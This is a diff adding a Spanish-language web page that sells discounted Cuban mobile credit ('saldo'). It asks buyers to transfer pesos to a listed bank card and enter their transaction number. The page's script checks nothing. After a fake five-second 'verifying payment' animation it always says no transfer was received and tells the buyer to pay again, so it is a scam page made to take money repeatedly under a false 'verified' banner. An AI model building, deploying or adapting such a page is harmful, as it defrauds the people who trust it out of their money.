@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Comprar Saldo - CubaRecarga</title>
+
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+
+    body {
+      background: linear-gradient(to bottom right, #c0f7ff, #ffffff);
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px 0;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    .container {
+      background-color: rgba(255, 255, 255, 0.95);
+      padding: 20px 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      max-width: 420px;
+      width: 100%;
+      margin: 0 10px 40px 10px;
+    }
+
+    .verificado {
+      background-color: #e0ffe0;
+      color: #1b5e20;
+      padding: 15px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      font-size: 14px;
+      font-weight: 500;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    h1 {
+      text-align: center;
+      color: #0f172a;
+      margin-bottom: 20px;
+    }
+
+    .alert {
+      background-color: #fef3c7;
+      color: #92400e;
+      font-weight: bold;
+      padding: 10px;
+      border-radius: 5px;
+      text-align: center;
+      margin-bottom: 20px;
+      border: 1px solid #fde68a;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+      color: #374151;
+    }
+
+    select, input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #d1d5db;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    .price {
+      margin-top: 15px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #10b981;
+      text-align: center;
+    }
+
+    .card-info {
+      margin-top: 15px;
+      background-color: #e0f2fe;
+      border-radius: 5px;
+      padding: 10px;
+      color: #0369a1;
+      font-weight: bold;
+      text-align: center;
+      user-select: all;
+      font-size: 16px;
+      word-wrap: break-word;
+    }
+
+    .btn {
+      margin-top: 25px;
+      background-color: #22c55e;
+      color: white;
+      padding: 12px;
+      text-align: center;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      transition: background 0.3s;
+    }
+
+    .btn:hover {
+      background-color: #16a34a;
+    }
+
+    .loading {
+      display: none;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .loading img {
+      width: 80px;
+      animation: float 2s infinite ease-in-out;
+    }
+
+    @keyframes float {
+      0% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+      100% { transform: translateY(0); }
+    }
+
+    .final-msg {
+      display: none;
+      background-color: #fff8dc;
+      border: 1px solid #facc15;
+      padding: 15px;
+      border-radius: 8px;
+      text-align: center;
+      color: #92400e;
+      font-weight: bold;
+    }
+
+    .regresar {
+      margin-top: 15px;
+      background-color: #3b82f6;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .regresar:hover {
+      background-color: #2563eb;
+    }
+
+    /* Estilos del formulario integrado */
+    form.contact-form {
+      margin-top: 30px;
+      background: #f9fafb;
+      padding: 20px 15px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.07);
+    }
+    form.contact-form h2 {
+      margin-bottom: 15px;
+      font-weight: 700;
+      color: #0f172a;
+      font-size: 18px;
+      text-align: center;
+    }
+    form.contact-form input,
+    form.contact-form textarea {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      font-size: 15px;
+      border-radius: 6px;
+      border: 1px solid #cbd5e1;
+      font-family: inherit;
+      resize: vertical;
+    }
+    form.contact-form button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      border-radius: 6px;
+      border: none;
+      background: #22c55e;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    form.contact-form button:hover {
+      background: #16a34a;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="verificado">
+      ✅ PAGINA CREADA Y ADMINISTRADA UNICAMENTE POR <strong>CUBAMAXTRAVEL</strong><br>
+      PARA USO DE CUBANOS Y ASÍ ELIMINAR PARTE DE SU AGOBIO POR PARTE DE LA EMPRESA.<br>
+      PARA CUALQUIER DUDA CONTACTAR VÍA CORREO A:<br>
+      <strong>cubamaxtravelsaldofree@gmail.com</strong>
+    </div>
+
+    <h1>Comprar Saldo</h1>
+
+    <div class="alert">
+      ¡Atención! Una vez enviada la transferencia toque "Confirmar pago"
+    </div>
+
+    <label for="recarga">Selecciona el monto</label>
+    <select id="recarga">
+      <option value="1950">1500 saldo - 1950 CUP</option>
+      <option value="3250">2500 saldo - 3250 CUP</option>
+      <option value="4700">3500 saldo - 4700 CUP</option>
+      <option value="6700">5500 saldo - 6700 CUP</option>
+      <option value="9500">8300 saldo - 9500 CUP</option>
+      <option value="8775">Promo Internacional (28 oct): 3000saldo + datos ilimitados (12am-7am) por 35 días - 8775 CUP</option>
+    </select>
+
+    <div class="price" id="precio">Total a pagar: 1950 CUP</div>
+
+    <div class="card-info">
+      Enviar transferencia a la tarjeta:<br><strong>9238 1299 7764 8304</strong>
+    </div>
+
+    <label for="telefono">Número de teléfono</label>
+    <input type="text" id="telefono" placeholder="Tu número de teléfono" />
+
+    <label for="transaccion">Escriba el No. de Transacción enviado por Transfermóvil</label>
+    <input type="text" id="transaccion" placeholder="Ej: BTR123456XYZ" />
+
+    <button class="btn" id="btn">Confirmar pago</button>
+
+    <div class="loading" id="loading">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Paper_Plane_Animated.gif" alt="Cargando..."><br>
+      <strong>Comprobando pago, espere unos segundos...</strong>
+    </div>
+
+    <div class="final-msg" id="finalMsg"></div>
+
+    <!-- Formulario integrado Formspree -->
+    <form class="contact-form" action="https://formspree.io/f/xanbvdol" method="POST">
+      <h2>Envíanos un mensaje</h2>
+      <input type="text" name="nombre" placeholder="Tu nombre" required>
+      <input type="email" name="email" placeholder="Tu correo" required>
+      <textarea name="mensaje" placeholder="Escribe tu mensaje" rows="4" required></textarea>
+      <button type="submit">Enviar mensaje</button>
+    </form>
+
+  </div>
+
+  <script>
+    const recarga = document.getElementById('recarga');
+    const precio = document.getElementById('precio');
+    const btn = document.getElementById('btn');
+    const telefonoInput = document.getElementById('telefono');
+    const transaccionInput = document.getElementById('transaccion');
+    const loading = document.getElementById('loading');
+    const finalMsg = document.getElementById('finalMsg');
+
+    recarga.addEventListener('change', () => {
+      const valor = recarga.value;
+      precio.innerText = `Total a pagar: ${valor} CUP`;
+    });
+
+    btn.addEventListener('click', () => {
+      const telefono = telefonoInput.value.trim();
+      const transaccion = transaccionInput.value.trim();
+
+      if (telefono === '') {
+        alert('Por favor, escribe tu número de teléfono antes de continuar.');
+        telefonoInput.focus();
+        return;
+      }
+
+      if (transaccion === '') {
+        alert('Por favor, escribe el número de transacción enviado por Transfermóvil.');
+        transaccionInput.focus();
+        return;
+      }
+
+      btn.style.display = 'none';
+      loading.style.display = 'block';
+
+      setTimeout(() => {
+        loading.style.display = 'none';
+        finalMsg.innerHTML = `
+          ❌ No se ha registrado ninguna transferencia del número <strong>${telefono}</strong>.<br>
+          Transfiera a la tarjeta designada y luego toque en confirmar.<br><br>
+          <button class="regresar" onclick="location.reload()">Regresar</button>
+        `;
+        finalMsg.style.display = 'block';
+      }, 5000);
+    });
+  </script>
+</body>
+</html>
